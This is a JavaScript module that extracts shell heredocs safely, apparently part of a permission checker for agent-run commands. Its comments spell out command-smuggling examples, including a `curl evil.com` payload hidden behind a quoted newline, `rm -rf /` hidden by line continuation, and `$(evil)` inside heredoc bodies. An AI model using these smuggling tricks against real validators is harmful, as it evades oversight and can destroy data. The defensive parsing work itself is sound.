"use strict";
/**
 * Heredoc extraction and restoration utilities.
 *
 * The shell-quote library parses `<<` as two separate `<` redirect operators,
 * which breaks command splitting for heredoc syntax. This module provides
 * utilities to extract heredocs before parsing and restore them after.
 *
 * Supported heredoc variations:
 * - <<WORD      - basic heredoc
 * - <<'WORD'    - single-quoted delimiter (no variable expansion in content)
 * - <<"WORD"    - double-quoted delimiter (with variable expansion)
 * - <<-WORD     - dash prefix (strips leading tabs from content)
 * - <<-'WORD'   - combined dash and quoted delimiter
 *
 * Known limitations:
 * - Heredocs inside backtick command substitution may not be extracted
 * - Very complex multi-heredoc scenarios may not be extracted
 *
 * When extraction fails, the command passes through unchanged. This is safe
 * because the unextracted heredoc will either cause shell-quote parsing to fail
 * (falling back to treating the whole command as one unit) or require manual
 * approval for each apparent subcommand.
 *
 * @module
 */
Object.defineProperty(exports, "__esModule", { value: true });
exports.extractHeredocs = extractHeredocs;
exports.restoreHeredocs = restoreHeredocs;
exports.containsHeredoc = containsHeredoc;
var crypto_1 = require("crypto");
var HEREDOC_PLACEHOLDER_PREFIX = '__HEREDOC_';
var HEREDOC_PLACEHOLDER_SUFFIX = '__';
/**
 * Generates a random hex string for placeholder uniqueness.
 * This prevents collision when command text literally contains "__HEREDOC_N__".
 */
function generatePlaceholderSalt() {
    // Generate 8 random bytes as hex (16 characters)
    return (0, crypto_1.randomBytes)(8).toString('hex');
}
/**
 * Regex pattern for matching heredoc start syntax.
 *
 * Two alternatives handle quoted vs unquoted delimiters differently:
 *
 * Alternative 1 (quoted): (['"]) (\\?\w+) \2
 *   Captures the opening quote, then the delimiter word (which MAY include a
 *   leading backslash since it's literal inside quotes), then the closing quote.
 *   In bash, single quotes make EVERYTHING literal including backslashes:
 *     <<'\EOF' → delimiter is \EOF (with backslash)
 *     <<'EOF'  → delimiter is EOF
 *   Double quotes also preserve backslashes before non-special chars:
 *     <<"\EOF" → delimiter is \EOF
 *
 * Alternative 2 (unquoted): \\?(\w+)
 *   Optionally consumes a leading backslash (escape), then captures the word.
 *   In bash, an unquoted backslash escapes the next character:
 *     <<\EOF → delimiter is EOF (backslash consumed as escape)
 *     <<EOF  → delimiter is EOF (plain)
 *
 * SECURITY: The backslash MUST be inside the capture group for quoted
 * delimiters but OUTSIDE for unquoted ones. The old regex had \\? outside
 * the capture group unconditionally, causing <<'\EOF' to extract delimiter
 * "EOF" while bash uses "\EOF", allowing command smuggling.
 *
 * Note: Uses [ \t]* (not \s*) to avoid matching across newlines, which would be
 * a security issue (could hide commands between << and the delimiter).
 */
var HEREDOC_START_PATTERN = 
// eslint-disable-next-line custom-rules/no-lookbehind-regex -- gated by command.includes('<<') at extractHeredocs() entry
/(?<!<)<<(?!<)(-)?[ \t]*(?:(['"])(\\?\w+)\2|\\?(\w+))/;
/**
 * Extracts heredocs from a command string and replaces them with placeholders.
 *
 * This allows shell-quote to parse the command without mangling heredoc syntax.
 * After parsing, use `restoreHeredocs` to replace placeholders with original content.
 *
 * @param command - The shell command string potentially containing heredocs
 * @returns Object containing the processed command and a map of placeholders to heredoc info
 *
 * @example
 * ```ts
 * const result = extractHeredocs(`cat <<EOF
 * hello world
 * EOF`);
 * // result.processedCommand === "cat __HEREDOC_0_a1b2c3d4__" (salt varies)
 * // result.heredocs has the mapping to restore later
 * ```
 */
function extractHeredocs(command, options) {
    var heredocs = new Map();
    // Quick check: if no << present, skip processing
    if (!command.includes('<<')) {
        return { processedCommand: command, heredocs: heredocs };
    }
    // Security: Paranoid pre-validation. Our incremental quote/comment scanner
    // (see advanceScan below) does simplified parsing that cannot handle all
    // bash quoting constructs. If the command contains
    // constructs that could desync our quote tracking, bail out entirely
    // rather than risk extracting a heredoc with incorrect boundaries.
    // This is defense-in-depth: each construct below has caused or could
    // cause a security bypass if we attempt extraction.
    //
    // Specifically, we bail if the command contains:
    // 1. $'...' or $"..." (ANSI-C / locale quoting — our quote tracker
    //    doesn't handle the $ prefix, would misparse the quotes)
    // 2. Backtick command substitution (backtick nesting has complex parsing
    //    rules, and backtick acts as shell_eof_token for PST_EOFTOKEN in
    //    make_cmd.c:606, enabling early heredoc closure that our parser
    //    can't replicate)
    if (/\$['"]/.test(command)) {
        return { processedCommand: command, heredocs: heredocs };
    }
    // Check for backticks in the command text before the first <<.
    // Backtick nesting has complex parsing rules, and backtick acts as
    // shell_eof_token for PST_EOFTOKEN (make_cmd.c:606), enabling early
    // heredoc closure that our parser can't replicate. We only check
    // before << because backticks in heredoc body content are harmless.
    var firstHeredocPos = command.indexOf('<<');
    if (firstHeredocPos > 0 && command.slice(0, firstHeredocPos).includes('`')) {
        return { processedCommand: command, heredocs: heredocs };
    }
    // Security: Check for arithmetic evaluation context before the first `<<`.
    // In bash, `(( x = 1 << 2 ))` uses `<<` as a BIT-SHIFT operator, not a
    // heredoc. If we mis-extract it, subsequent lines become "heredoc content"
    // and are hidden from security validators, while bash executes them as
    // separate commands. We bail entirely if `((` appears before `<<` without
    // a matching `))` — we can't reliably distinguish arithmetic `<<` from
    // heredoc `<<` in that context. Note: $(( is already caught by
    // validateDangerousPatterns, but bare (( is not.
    if (firstHeredocPos > 0) {
        var beforeHeredoc = command.slice(0, firstHeredocPos);
        // Count (( and )) occurrences — if unbalanced, `<<` may be arithmetic
        var openArith = (beforeHeredoc.match(/\(\(/g) || []).length;
        var closeArith = (beforeHeredoc.match(/\)\)/g) || []).length;
        if (openArith > closeArith) {
            return { processedCommand: command, heredocs: heredocs };
        }
    }
    // Create a global version of the pattern for iteration
    var heredocStartPattern = new RegExp(HEREDOC_START_PATTERN.source, 'g');
    var heredocMatches = [];
    // Security: When quotedOnly skips an unquoted heredoc, we still need to
    // track its content range so the nesting filter can reject quoted heredocs
    // that appear INSIDE the skipped unquoted heredoc's body. Without this,
    // `cat <<EOF\n<<'SAFE'\n$(evil)\nSAFE\nEOF` would extract <<'SAFE' as a
    // top-level heredoc, hiding $(evil) from validators — even though in bash,
    // $(evil) IS executed (unquoted <<EOF expands its body).
    var skippedHeredocRanges = [];
    var match;
    // Incremental quote/comment scanner state.
    //
    // The regex walks forward through the command, and match.index is monotonically
    // increasing. Previously, isInsideQuotedString and isInsideComment each
    // re-scanned from position 0 on every match — O(n²) when the heredoc body
    // contains many `<<` (e.g. C++ with `std::cout << ...`). A 200-line C++
    // heredoc hit ~3.7ms per extractHeredocs call, and Bash security validation
    // calls extractHeredocs multiple times per command.
    //
    // Instead, track quote/comment/escape state incrementally and advance from
    // the last scanned position. This preserves the OLD helpers' exact semantics:
    //
    //   Quote state (was isInsideQuotedString) is COMMENT-BLIND — it never sees
    //   `#` and never skips characters for being "in a comment". Inside single
    //   quotes, everything is literal. Inside double quotes, backslash escapes
    //   the next char. An unquoted backslash run of odd length escapes the next
    //   char.
    //
    //   Comment state (was isInsideComment) observes quote state (# inside quotes
    //   is not a comment) but NOT the reverse. The old helper used a per-call
    //   `lineStart = lastIndexOf('\n', pos-1)+1` bound on which `#` to consider;
    //   equivalently, any physical `\n` clears comment state — including `\n`
    //   inside quotes (since lastIndexOf was quote-blind).
    //
    // SECURITY: Do NOT let comment mode suppress quote-state updates. If `#` put
    // the scanner in a mode that skipped quote chars, then `echo x#"\n<<...`
    // (where bash treats `#` as part of the word `x#`, NOT a comment) would
    // report the `<<` as unquoted and EXTRACT it — hiding content from security
    // validators. The old isInsideQuotedString was comment-blind; we preserve
    // that. Both old and new over-eagerly treat any unquoted `#` as a comment
    // (bash requires word-start), but since quote tracking is independent, the
    // over-eagerness only affects the comment check — causing SKIPS (safe
    // direction), never extra EXTRACTIONS.
    var scanPos = 0;
    var scanInSingleQuote = false;
    var scanInDoubleQuote = false;
    var scanInComment = false;
    // Inside "...": true if the previous char was a backslash (next char is escaped).
    // Carried across advanceScan calls so a `\` at scanPos-1 correctly escapes
    // the char at scanPos.
    var scanDqEscapeNext = false;
    // Unquoted context: length of the consecutive backslash run ending at scanPos-1.
    // Used to determine if the char at scanPos is escaped (odd run = escaped).
    var scanPendingBackslashes = 0;
    var advanceScan = function (target) {
        for (var i = scanPos; i < target; i++) {
            var ch = command[i];
            // Any physical newline clears comment state. The old isInsideComment
            // used `lineStart = lastIndexOf('\n', pos-1)+1` (quote-blind), so a
            // `\n` inside quotes still advanced lineStart. Match that here by
            // clearing BEFORE the quote branches.
            if (ch === '\n')
                scanInComment = false;
            if (scanInSingleQuote) {
                if (ch === "'")
                    scanInSingleQuote = false;
                continue;
            }
            if (scanInDoubleQuote) {
                if (scanDqEscapeNext) {
                    scanDqEscapeNext = false;
                    continue;
                }
                if (ch === '\\') {
                    scanDqEscapeNext = true;
                    continue;
                }
                if (ch === '"')
                    scanInDoubleQuote = false;
                continue;
            }
            // Unquoted context. Quote tracking is COMMENT-BLIND (same as the old
            // isInsideQuotedString): we do NOT skip chars for being inside a
            // comment. Only the `#` detection itself is gated on not-in-comment.
            if (ch === '\\') {
                scanPendingBackslashes++;
                continue;
            }
            var escaped = scanPendingBackslashes % 2 === 1;
            scanPendingBackslashes = 0;
            if (escaped)
                continue;
            if (ch === "'")
                scanInSingleQuote = true;
            else if (ch === '"')
                scanInDoubleQuote = true;
            else if (!scanInComment && ch === '#')
                scanInComment = true;
        }
        scanPos = target;
    };
    while ((match = heredocStartPattern.exec(command)) !== null) {
        var startIndex = match.index;
        // Advance the incremental scanner to this match's position. After this,
        // scanInSingleQuote/scanInDoubleQuote/scanInComment reflect the parser
        // state immediately BEFORE startIndex, and scanPendingBackslashes is the
        // count of unquoted `\` immediately preceding startIndex.
        advanceScan(startIndex);
        // Skip if this << is inside a quoted string (not a real heredoc operator).
        if (scanInSingleQuote || scanInDoubleQuote) {
            continue;
        }
        // Security: Skip if this << is inside a comment (after unquoted #).
        // In bash, `# <<EOF` is a comment — extracting it would hide commands on
        // subsequent lines as "heredoc content" while bash executes them.
        if (scanInComment) {
            continue;
        }
        // Security: Skip if this << is preceded by an odd number of backslashes.
        // In bash, `\<<EOF` is NOT a heredoc — `\<` is a literal `<`, then `<EOF`
        // is input redirection. Extracting it would drop same-line commands from
        // security checks. The scanner tracks the unquoted backslash run ending
        // immediately before startIndex (scanPendingBackslashes).
        if (scanPendingBackslashes % 2 === 1) {
            continue;
        }
        // Security: Bail if this `<<` falls inside the body of a previously
        // SKIPPED heredoc (unquoted heredoc in quotedOnly mode). In bash,
        // `<<` inside a heredoc body is just text — it's not a nested heredoc
        // operator. Extracting it would hide content that bash actually expands.
        var insideSkipped = false;
        for (var _a = 0, skippedHeredocRanges_1 = skippedHeredocRanges; _a < skippedHeredocRanges_1.length; _a++) {
            var skipped = skippedHeredocRanges_1[_a];
            if (startIndex > skipped.contentStartIndex &&
                startIndex < skipped.contentEndIndex) {
                insideSkipped = true;
                break;
            }
        }
        if (insideSkipped) {
            continue;
        }
        var fullMatch = match[0];
        var isDash = match[1] === '-';
        // Group 3 = quoted delimiter (may include backslash), group 4 = unquoted
        var delimiter = (match[3] || match[4]);
        var operatorEndIndex = startIndex + fullMatch.length;
        // Security: Two checks to verify our regex captured the full delimiter word.
        // Any mismatch between our parsed delimiter and bash's actual delimiter
        // could allow command smuggling past permission checks.
        // Check 1: If a quote was captured (group 2), verify the closing quote
        // was actually matched by \2 in the regex (the quoted alternative requires
        // the closing quote). The regex's \w+ only matches [a-zA-Z0-9_], so
        // non-word chars inside quotes (spaces, hyphens, dots) cause \w+ to stop
        // early, leaving the closing quote unmatched.
        // Example: <<"EO F" — regex captures "EO", misses closing ", delimiter
        // should be "EO F" but we'd use "EO". Skip to prevent mismatch.
        var quoteChar = match[2];
        if (quoteChar && command[operatorEndIndex - 1] !== quoteChar) {
            continue;
        }
        // Security: Determine if the delimiter is quoted ('EOF', "EOF") or
        // escaped (\EOF). In bash, quoted/escaped delimiters suppress all
        // expansion in the heredoc body — content is literal text. Unquoted
        // delimiters (<<EOF) perform full shell expansion: $(), backticks,
        // and ${} in the body ARE executed. When quotedOnly is set, skip
        // unquoted heredocs so their bodies remain visible to security
        // validators (they may contain executable command substitutions).
        var isEscapedDelimiter = fullMatch.includes('\\');
        var isQuotedOrEscaped = !!quoteChar || isEscapedDelimiter;
        // Note: We do NOT skip unquoted heredocs here anymore when quotedOnly is
        // set. Instead, we compute their content range and add them to
        // skippedHeredocRanges, then skip them AFTER finding the closing
        // delimiter. This lets the nesting filter correctly reject quoted
        // "heredocs" that appear inside unquoted heredoc bodies.
        // Check 2: Verify the next character after our match is a bash word
        // terminator (metacharacter or end of string). Characters like word chars,
        // quotes, $, \ mean the bash word extends beyond our match
        // (e.g., <<'EOF'a where bash uses "EOFa" but we captured "EOF").
        // IMPORTANT: Only match bash's actual metacharacters — space (0x20),
        // tab (0x09), newline (0x0A), |, &, ;, (, ), <, >. Do NOT use \s which
        // also matches \r, \f, \v, and Unicode whitespace that bash treats as
        // regular word characters, not terminators.
        if (operatorEndIndex < command.length) {
            var nextChar = command[operatorEndIndex];
            if (!/^[ \t\n|&;()<>]$/.test(nextChar)) {
                continue;
            }
        }
        // In bash, heredoc content starts on the NEXT LINE after the operator.
        // Any content on the same line after <<EOF (like " && echo done") is part
        // of the command, not the heredoc content.
        //
        // SECURITY: The "same line" must be the LOGICAL command line, not the
        // first physical newline. Multi-line quoted strings extend the logical
        // line — bash waits for the quote to close before starting to read the
        // heredoc body. A quote-blind `indexOf('\n')` finds newlines INSIDE
        // quoted strings, causing the body to start too early.
        //
        // Exploit: `echo <<'EOF' '${}\n' ; curl evil.com\nEOF`
        //   - The `\n` inside `'${}\n'` is quoted (literal newline in a string arg)
        //   - Bash: waits for `'` to close → logical line is
        //     `echo <<'EOF' '${}\n' ; curl evil.com` → heredoc body = `EOF`
        //   - Our old code: indexOf('\n') finds the quoted newline → body starts
        //     at `' ; curl evil.com\nEOF` → curl swallowed into placeholder →
        //     NEVER reaches permission checks.
        //
        // Fix: scan forward from operatorEndIndex using quote-state tracking,
        // finding the first newline that's NOT inside a quoted string. Same
        // quote-tracking semantics as advanceScan (already used to validate
        // the `<<` operator position above).
        var firstNewlineOffset = -1;
        {
            var inSingleQuote = false;
            var inDoubleQuote = false;
            // We start with clean quote state — advanceScan already rejected the
            // case where the `<<` operator itself is inside a quote.
            for (var k = operatorEndIndex; k < command.length; k++) {
                var ch = command[k];
                if (inSingleQuote) {
                    if (ch === "'")
                        inSingleQuote = false;
                    continue;
                }
                if (inDoubleQuote) {
                    if (ch === '\\') {
                        k++; // skip escaped char inside double quotes
                        continue;
                    }
                    if (ch === '"')
                        inDoubleQuote = false;
                    continue;
                }
                // Unquoted context
                if (ch === '\n') {
                    firstNewlineOffset = k - operatorEndIndex;
                    break;
                }
                // Count backslashes for escape detection in unquoted context
                var backslashCount = 0;
                for (var j = k - 1; j >= operatorEndIndex && command[j] === '\\'; j--) {
                    backslashCount++;
                }
                if (backslashCount % 2 === 1)
                    continue; // escaped char
                if (ch === "'")
                    inSingleQuote = true;
                else if (ch === '"')
                    inDoubleQuote = true;
            }
            // If we ended while still inside a quote, the logical line never ends —
            // there is no heredoc body. Leave firstNewlineOffset as -1 (handled below).
        }
        // If no unquoted newline found, this heredoc has no content - skip it
        if (firstNewlineOffset === -1) {
            continue;
        }
        // Security: Check for backslash-newline continuation at the end of the
        // same-line content (text between the operator and the newline). In bash,
        // `\<newline>` joins lines BEFORE heredoc parsing — so:
        //   cat <<'EOF' && \
        //   rm -rf /
        //   content
        //   EOF
        // bash joins to `cat <<'EOF' && rm -rf /` (rm is part of the command line),
        // then heredoc body = `content`. Our extractor runs BEFORE continuation
        // joining (commands.ts:82), so it would put `rm -rf /` in the heredoc body,
        // hiding it from all validators. Bail if same-line content ends with an
        // odd number of backslashes.
        var sameLineContent = command.slice(operatorEndIndex, operatorEndIndex + firstNewlineOffset);
        var trailingBackslashes = 0;
        for (var j = sameLineContent.length - 1; j >= 0; j--) {
            if (sameLineContent[j] === '\\') {
                trailingBackslashes++;
            }
            else {
                break;
            }
        }
        if (trailingBackslashes % 2 === 1) {
            // Odd number of trailing backslashes → last one escapes the newline
            // → this is a line continuation. Our heredoc-before-continuation order
            // would misparse this. Bail out.
            continue;
        }
        var contentStartIndex = operatorEndIndex + firstNewlineOffset;
        var afterNewline = command.slice(contentStartIndex + 1); // +1 to skip the newline itself
        var contentLines = afterNewline.split('\n');
        // Find the closing delimiter - must be on its own line
        // Security: Must match bash's exact behavior to prevent parsing discrepancies
        // that could allow command smuggling past permission checks.
        var closingLineIndex = -1;
        for (var i = 0; i < contentLines.length; i++) {
            var line = contentLines[i];
            if (isDash) {
                // <<- strips leading TABS only (not spaces), per POSIX/bash spec.
                // The line after stripping leading tabs must be exactly the delimiter.
                var stripped = line.replace(/^\t*/, '');
                if (stripped === delimiter) {
                    closingLineIndex = i;
                    break;
                }
            }
            else {
                // << requires the closing delimiter to be exactly alone on the line
                // with NO leading or trailing whitespace. This matches bash behavior.
                if (line === delimiter) {
                    closingLineIndex = i;
                    break;
                }
            }
            // Security: Check for PST_EOFTOKEN-like early closure (make_cmd.c:606).
            // Inside $(), ${}, or backtick substitution, bash closes a heredoc when
            // a line STARTS with the delimiter and contains the shell_eof_token
            // (`)`, `}`, or backtick) anywhere after it. Our parser only does exact
            // line matching, so this discrepancy could hide smuggled commands.
            //
            // Paranoid extension: also bail on bash metacharacters (|, &, ;, (, <,
            // >) after the delimiter, which could indicate command syntax from a
            // parsing discrepancy we haven't identified.
            //
            // For <<- heredocs, bash strips leading tabs before this check.
            var eofCheckLine = isDash ? line.replace(/^\t*/, '') : line;
            if (eofCheckLine.length > delimiter.length &&
                eofCheckLine.startsWith(delimiter)) {
                var charAfterDelimiter = eofCheckLine[delimiter.length];
                if (/^[)}`|&;(<>]$/.test(charAfterDelimiter)) {
                    // Shell metacharacter or substitution closer after delimiter —
                    // bash may close the heredoc early here. Bail out.
                    closingLineIndex = -1;
                    break;
                }
            }
        }
        // Security: If quotedOnly mode is set and this is an unquoted heredoc,
        // record its content range for nesting checks but do NOT add it to
        // heredocMatches. This ensures quoted "heredocs" inside its body are
        // correctly rejected by the insideSkipped check on subsequent iterations.
        //
        // CRITICAL: We do this BEFORE the closingLineIndex === -1 check. If the
        // unquoted heredoc has no closing delimiter, bash still treats everything
        // to end-of-input as the heredoc body (and expands $() within it). We
        // must block extraction of any subsequent quoted "heredoc" that falls
        // inside that unbounded body.
        if ((options === null || options === void 0 ? void 0 : options.quotedOnly) && !isQuotedOrEscaped) {
            var skipContentEndIndex = void 0;
            if (closingLineIndex === -1) {
                // No closing delimiter — in bash, heredoc body extends to end of
                // input. Track the entire remaining range as "skipped body".
                skipContentEndIndex = command.length;
            }
            else {
                var skipLinesUpToClosing = contentLines.slice(0, closingLineIndex + 1);
                var skipContentLength = skipLinesUpToClosing.join('\n').length;
                skipContentEndIndex = contentStartIndex + 1 + skipContentLength;
            }
            skippedHeredocRanges.push({
                contentStartIndex: contentStartIndex,
                contentEndIndex: skipContentEndIndex,
            });
            continue;
        }
        // If no closing delimiter found, this is malformed - skip it
        if (closingLineIndex === -1) {
            continue;
        }
        // Calculate end position: contentStartIndex + 1 (newline) + length of lines up to and including closing delimiter
        var linesUpToClosing = contentLines.slice(0, closingLineIndex + 1);
        var contentLength = linesUpToClosing.join('\n').length;
        var contentEndIndex = contentStartIndex + 1 + contentLength;
        // Security: Bail if this heredoc's content range OVERLAPS with any
        // previously-skipped heredoc's content range. This catches the case where
        // two heredocs share a command line (`cat <<EOF <<'SAFE'`) and the first
        // is unquoted (skipped in quotedOnly mode). In bash, when multiple heredocs
        // share a line, their bodies appear SEQUENTIALLY (first's body, then
        // second's). Both compute contentStartIndex from the SAME newline, so the
        // second's body search walks through the first's body. For:
        //   cat <<EOF <<'SAFE'
        //   $(evil_command)
        //   EOF
        //   safe body
        //   SAFE
        // ...the quoted <<'SAFE' would incorrectly extract lines 2-4 as its body,
        // swallowing `$(evil_command)` (which bash EXECUTES via the unquoted
        // <<EOF's expansion) into the placeholder, hiding it from validators.
        //
        // The insideSkipped check above doesn't catch this because the quoted
        // operator's startIndex is on the command line BEFORE contentStart.
        // The contentStartPositions dedup check below doesn't catch it because the
        // skipped heredoc is in skippedHeredocRanges, not topLevelHeredocs.
        var overlapsSkipped = false;
        for (var _b = 0, skippedHeredocRanges_2 = skippedHeredocRanges; _b < skippedHeredocRanges_2.length; _b++) {
            var skipped = skippedHeredocRanges_2[_b];
            // Ranges [a,b) and [c,d) overlap iff a < d && c < b
            if (contentStartIndex < skipped.contentEndIndex &&
                skipped.contentStartIndex < contentEndIndex) {
                overlapsSkipped = true;
                break;
            }
        }
        if (overlapsSkipped) {
            continue;
        }
        // Build fullText: operator + newline + content (normalized form for restoration)
        // This creates a clean heredoc that can be restored correctly
        var operatorText = command.slice(startIndex, operatorEndIndex);
        var contentText = command.slice(contentStartIndex, contentEndIndex);
        var fullText = operatorText + contentText;
        heredocMatches.push({
            fullText: fullText,
            delimiter: delimiter,
            operatorStartIndex: startIndex,
            operatorEndIndex: operatorEndIndex,
            contentStartIndex: contentStartIndex,
            contentEndIndex: contentEndIndex,
        });
    }
    // If no valid heredocs found, return original
    if (heredocMatches.length === 0) {
        return { processedCommand: command, heredocs: heredocs };
    }
    // Filter out nested heredocs - any heredoc whose operator starts inside
    // another heredoc's content range should be excluded.
    // This prevents corruption when heredoc content contains << patterns.
    var topLevelHeredocs = heredocMatches.filter(function (candidate, _i, all) {
        // Check if this candidate's operator is inside any other heredoc's content
        for (var _a = 0, all_1 = all; _a < all_1.length; _a++) {
            var other = all_1[_a];
            if (candidate === other)
                continue;
            // Check if candidate's operator starts within other's content range
            if (candidate.operatorStartIndex > other.contentStartIndex &&
                candidate.operatorStartIndex < other.contentEndIndex) {
                // This heredoc is nested inside another - filter it out
                return false;
            }
        }
        return true;
    });
    // If filtering removed all heredocs, return original
    if (topLevelHeredocs.length === 0) {
        return { processedCommand: command, heredocs: heredocs };
    }
    // Check for multiple heredocs sharing the same content start position
    // (i.e., on the same line). This causes index corruption during replacement
    // because indices are calculated on the original string but applied to
    // a progressively modified string. Return without extraction - the fallback
    // is safe (requires manual approval or fails parsing).
    var contentStartPositions = new Set(topLevelHeredocs.map(function (h) { return h.contentStartIndex; }));
    if (contentStartPositions.size < topLevelHeredocs.length) {
        return { processedCommand: command, heredocs: heredocs };
    }
    // Sort by content end position descending so we can replace from end to start
    // (this preserves indices for earlier replacements)
    topLevelHeredocs.sort(function (a, b) { return b.contentEndIndex - a.contentEndIndex; });
    // Generate a unique salt for this extraction to prevent placeholder collisions
    // with literal "__HEREDOC_N__" text in commands
    var salt = generatePlaceholderSalt();
    var processedCommand = command;
    topLevelHeredocs.forEach(function (info, index) {
        // Use reverse index since we sorted descending
        var placeholderIndex = topLevelHeredocs.length - 1 - index;
        var placeholder = "".concat(HEREDOC_PLACEHOLDER_PREFIX).concat(placeholderIndex, "_").concat(salt).concat(HEREDOC_PLACEHOLDER_SUFFIX);
        heredocs.set(placeholder, info);
        // Replace heredoc with placeholder while preserving same-line content:
        // - Keep everything before the operator
        // - Replace operator with placeholder
        // - Keep content between operator and heredoc content (e.g., " && echo done")
        // - Remove the heredoc content (from newline through closing delimiter)
        // - Keep everything after the closing delimiter
        processedCommand =
            processedCommand.slice(0, info.operatorStartIndex) +
                placeholder +
                processedCommand.slice(info.operatorEndIndex, info.contentStartIndex) +
                processedCommand.slice(info.contentEndIndex);
    });
    return { processedCommand: processedCommand, heredocs: heredocs };
}
/**
 * Restores heredoc placeholders back to their original content in a single string.
 * Internal helper used by restoreHeredocs.
 */
function restoreHeredocsInString(text, heredocs) {
    var result = text;
    for (var _a = 0, heredocs_1 = heredocs; _a < heredocs_1.length; _a++) {
        var _b = heredocs_1[_a], placeholder = _b[0], info = _b[1];
        result = result.replaceAll(placeholder, info.fullText);
    }
    return result;
}
/**
 * Restores heredoc placeholders in an array of strings.
 *
 * @param parts - Array of strings that may contain heredoc placeholders
 * @param heredocs - The map of placeholders from `extractHeredocs`
 * @returns New array with placeholders replaced by original heredoc content
 */
function restoreHeredocs(parts, heredocs) {
    if (heredocs.size === 0) {
        return parts;
    }
    return parts.map(function (part) { return restoreHeredocsInString(part, heredocs); });
}
/**
 * Checks if a command contains heredoc syntax.
 *
 * This is a quick check that doesn't validate the heredoc is well-formed,
 * just that the pattern exists.
 *
 * @param command - The shell command string
 * @returns true if the command appears to contain heredoc syntax
 */
function containsHeredoc(command) {
    return HEREDOC_START_PATTERN.test(command);
}
